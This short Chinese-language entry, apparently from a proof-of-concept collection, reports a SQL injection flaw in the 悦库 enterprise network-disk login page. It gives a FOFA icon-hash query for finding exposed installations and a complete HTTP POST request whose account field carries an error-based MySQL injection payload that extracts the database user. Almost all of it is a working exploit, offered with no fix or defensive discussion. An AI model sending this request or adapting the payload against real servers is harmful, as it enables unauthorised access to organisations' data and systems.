## 悦库企业网盘userlogin.html存在SQL注入漏洞

## fofa

```
icon_hash="522281537"
```

## poc

```
POST /user/login/.html HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: 
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: windowWidth=1536; windowHeight=695; yid=ovqhgolslu27u6vioar0guiilf; lang=zh-cn; device=desktop; theme=default
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 90

account=') AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(5597=5597,user()))),0x7e),5597)-- HZLK
```

![image-20240616191544376](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406161915424.png)